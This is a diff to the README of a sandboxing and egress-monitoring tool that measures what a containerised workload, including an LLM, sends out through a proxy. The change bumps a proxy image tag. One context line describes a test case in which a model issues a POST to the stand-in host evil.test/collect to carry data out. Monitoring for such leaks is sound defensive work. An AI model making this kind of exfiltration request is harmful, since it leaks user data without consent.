@@ -30,7 +30,7 @@ poi clean run                                                      # removes the
 ```
 
 Expected report: 1 allowed request, 0 user-data hits in allowed traffic, covert channel upper bound
-of 27 bits. The first `poi run` builds the `poi-proxy:0.1` image (requires network access).
+of 27 bits. The first `poi run` builds the `poi-proxy:0.2` image (requires network access).
 
 Custom workload: any image and command in place of `python:3.12-slim python /app/job.py`. The workload
 must use `HTTP(S)_PROXY` and trust the CA from `SSL_CERT_FILE` (both are set automatically).
@@ -85,6 +85,6 @@ two reverse DNS lookups and a **model-issued** `POST evil.test/collect` carrying
 
 ```bash
 pytest -m "not docker"           # unit tests
-pytest -m "docker and not gpu"   # end-to-end with real Docker (builds the poi-proxy:0.1 image)
+pytest -m "docker and not gpu"   # end-to-end with real Docker (builds the poi-proxy:0.2 image)
 pytest -m "docker and gpu"       # LLM case: NVIDIA GPU, vLLM 0.11 image and Qwen3-0.6B in the HF cache
 ```
